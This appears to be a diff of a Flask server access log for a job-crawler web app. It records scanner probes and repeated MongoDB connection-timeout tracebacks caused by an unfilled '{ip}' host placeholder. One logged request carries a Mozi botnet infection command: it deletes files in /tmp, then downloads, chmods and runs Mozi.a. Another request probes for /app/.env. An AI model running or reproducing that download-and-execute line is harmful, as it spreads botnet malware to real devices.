+206.168.34.201 - - [06/Feb/2025 02:57:28] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x16[0m" 400 -
+206.168.34.201 - - [06/Feb/2025 02:58:10] code 400, message Bad request syntax ('ZG\x00\x00\x00\x05\x00+\x0e\x01\x00')
+206.168.34.201 - - [06/Feb/2025 02:58:10] "[31m[1mZG\x00\x00\x00\x05\x00+\x0e\x01\x00[0m" 400 -
+18.237.20.27 - - [06/Feb/2025 03:03:14] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+18.237.20.27 - - [06/Feb/2025 03:03:15] "HEAD / HTTP/1.1" 200 -
+18.237.20.27 - - [06/Feb/2025 03:03:15] "GET / HTTP/1.1" 200 -
+18.237.20.27 - - [06/Feb/2025 03:03:15] "GET /static/styles.css HTTP/1.1" 200 -
+121.225.148.80 - - [06/Feb/2025 03:03:54] "GET / HTTP/1.1" 200 -
+27.98.228.3 - - [06/Feb/2025 03:03:54] code 400, message Bad request version ('À\x13À')
+27.98.228.3 - - [06/Feb/2025 03:03:54] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x8d®ä\x13½G»FNþÚú-\x13Æ\x1b\x84\x16!X/\x92J-à\x1c[\x0b\x86Gï( A~uÛ=]\x10ìÚg\x89L\x0cu}xÄZ\x99¬ñÞéóSÔåÑ\x88Ö<K\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+121.225.149.167 - - [06/Feb/2025 03:03:57] code 400, message Bad request version ('À\x13À')
+121.225.149.167 - - [06/Feb/2025 03:03:57] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Î\x10@´K\x8eÉ´vÏ\x0c\x90^Ê_ÊÍ\x19\x954E\x06:¡àÞ\x84+\x1dEÜn \x07¢\x0ck\x93QF¾x½©\x00ÐäµoOáÃ9)d| \x10\x1c¢á)Y½ñ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+119.164.106.91 - - [06/Feb/2025 03:04:05] code 400, message Bad request syntax ('{\x01\x00\x1613911111112À¨\x01\x01\x13\x90{')
+119.164.106.91 - - [06/Feb/2025 03:04:05] "[31m[1m{\x01\x00\x1613911111112À¨\x01\x01\x13\x90{[0m" 400 -
+101.70.104.112 - - [06/Feb/2025 03:04:06] "GET / HTTP/1.0" 200 -
+118.212.120.134 - - [06/Feb/2025 03:04:14] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x02\x00\x00\x00\x00\x15\x00\x032~')
+118.212.120.134 - - [06/Feb/2025 03:04:14] "[31m[1m~\x00\x02\x00\x00\x02\x00\x00\x00\x00\x15\x00\x032~[0m" 400 -
+175.30.48.240 - - [06/Feb/2025 03:05:03] "GET / HTTP/1.1" 200 -
+42.63.43.162 - - [06/Feb/2025 03:05:03] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+45.149.241.61 - - [06/Feb/2025 03:12:21] "GET / HTTP/1.0" 200 -
+46.19.138.234 - - [06/Feb/2025 03:13:08] "GET / HTTP/1.1" 200 -
+185.247.137.195 - - [06/Feb/2025 03:28:37] "GET / HTTP/1.1" 200 -
+195.178.110.98 - - [06/Feb/2025 03:30:20] "[33mGET /app/.env HTTP/1.1[0m" 404 -
+8.137.124.252 - - [06/Feb/2025 03:43:57] "GET / HTTP/1.1" 200 -
+45.149.241.61 - - [06/Feb/2025 03:51:56] "GET / HTTP/1.1" 200 -
+198.235.24.163 - - [06/Feb/2025 04:03:38] "GET / HTTP/1.0" 200 -
+37.10.114.9 - - [06/Feb/2025 04:05:23] "GET / HTTP/1.1" 200 -
+37.10.114.9 - - [06/Feb/2025 04:05:24] code 400, message Bad request version ('À\x14À')
+37.10.114.9 - - [06/Feb/2025 04:05:24] "[31m[1m\x16\x03\x01\x00\x91\x01\x00\x00\x8d\x03\x03Eú\x839\x07\x96n°­\x85\x1aê³\x8bÞnÉ\x04þ\x87\x8d\x0b»U\x09H%Í¡Ç¥\x92\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+37.10.114.9 - - [06/Feb/2025 04:05:24] "GET / HTTP/1.1" 200 -
+37.10.114.9 - - [06/Feb/2025 04:05:25] "GET / HTTP/1.1" 200 -
+37.10.114.9 - - [06/Feb/2025 04:05:25] "GET / HTTP/1.1" 200 -
+211.196.100.34 - - [06/Feb/2025 04:31:00] "GET / HTTP/1.1" 200 -
+211.196.100.34 - - [06/Feb/2025 04:31:00] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+211.196.100.34 - - [06/Feb/2025 04:31:01] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+[2025-02-06 04:31:31,210] ERROR in app: Exception on /api/jobs/count [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 85, in get_job_counts
+    counts = list(collection.aggregate(pipeline))
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2978, in aggregate
+    return self._aggregate(
+           ^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2886, in _aggregate
+    return self._database.client._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a76, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+211.196.100.34 - - [06/Feb/2025 04:31:31] "[35m[1mGET /api/jobs/count HTTP/1.1[0m" 500 -
+[2025-02-06 04:31:31,419] ERROR in app: Exception on /api/last-crawl [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 95, in get_last_crawl_time
+    last_crawl = meta_collection.find_one({"type": "last_crawl"})
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1755, in find_one
+    for result in cursor.limit(-1):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1281, in __next__
+    return self.next()
+           ^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1257, in next
+    if len(self._data) or self._refresh():
+                          ^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1205, in _refresh
+    self._send_message(q)
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1100, in _send_message
+    response = client._run_operation(
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1752, in _run_operation
+    return self._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a77, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+211.196.100.34 - - [06/Feb/2025 04:31:31] "[35m[1mGET /api/last-crawl HTTP/1.1[0m" 500 -
+72.4.96.36 - - [06/Feb/2025 04:35:51] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1[0m" 404 -
+206.168.34.84 - - [06/Feb/2025 04:45:58] code 400, message Bad request version ('À\x14À')
+206.168.34.84 - - [06/Feb/2025 04:45:58] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03}ßDC#1\x9c®éà NÔ´e!\x0c\x9e©,Æ¤Zî4FÍ\x16\x14 -o \x9aX{®0u\x1c\x0fËº\x01\x92I\x9f<r³K\x00å£\x19Ã\x09\x8fÍ¦\x90E`\x1eþ\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+206.168.34.84 - - [06/Feb/2025 04:46:35] code 400, message Bad request syntax ('ZG\x00\x00\x00\x05\x00+\x0e\x01\x00')
+206.168.34.84 - - [06/Feb/2025 04:46:35] "[31m[1mZG\x00\x00\x00\x05\x00+\x0e\x01\x00[0m" 400 -
+116.203.211.224 - - [06/Feb/2025 04:46:53] "GET / HTTP/1.1" 200 -
+34.60.226.170 - - [06/Feb/2025 05:05:44] "GET / HTTP/1.1" 200 -
+64.62.197.220 - - [06/Feb/2025 05:06:48] "GET / HTTP/1.1" 200 -
+64.62.197.217 - - [06/Feb/2025 05:07:00] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+95.214.55.43 - - [06/Feb/2025 05:26:05] "GET / HTTP/1.1" 200 -
+45.149.241.61 - - [06/Feb/2025 05:36:16] "HEAD / HTTP/1.1" 200 -
+45.149.241.61 - - [06/Feb/2025 05:36:17] "GET / HTTP/1.1" 200 -
+211.196.100.34 - - [06/Feb/2025 05:47:06] "GET / HTTP/1.1" 200 -
+211.196.100.34 - - [06/Feb/2025 05:47:06] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+211.196.100.34 - - [06/Feb/2025 05:47:09] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+[2025-02-06 05:47:37,713] ERROR in app: Exception on /api/last-crawl [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 95, in get_last_crawl_time
+    last_crawl = meta_collection.find_one({"type": "last_crawl"})
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1755, in find_one
+    for result in cursor.limit(-1):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1281, in __next__
+    return self.next()
+           ^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1257, in next
+    if len(self._data) or self._refresh():
+                          ^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1205, in _refresh
+    self._send_message(q)
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1100, in _send_message
+    response = client._run_operation(
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1752, in _run_operation
+    return self._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a77, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+211.196.100.34 - - [06/Feb/2025 05:47:37] "[35m[1mGET /api/last-crawl HTTP/1.1[0m" 500 -
+[2025-02-06 05:47:37,982] ERROR in app: Exception on /api/jobs/count [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 85, in get_job_counts
+    counts = list(collection.aggregate(pipeline))
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2978, in aggregate
+    return self._aggregate(
+           ^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2886, in _aggregate
+    return self._database.client._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a76, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+211.196.100.34 - - [06/Feb/2025 05:47:37] "[35m[1mGET /api/jobs/count HTTP/1.1[0m" 500 -
+211.196.100.34 - - [06/Feb/2025 05:49:40] "GET / HTTP/1.1" 200 -
+211.196.100.34 - - [06/Feb/2025 05:49:40] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+[2025-02-06 05:50:11,569] ERROR in app: Exception on /api/jobs/count [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 85, in get_job_counts
+    counts = list(collection.aggregate(pipeline))
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2978, in aggregate
+    return self._aggregate(
+           ^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2886, in _aggregate
+    return self._database.client._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
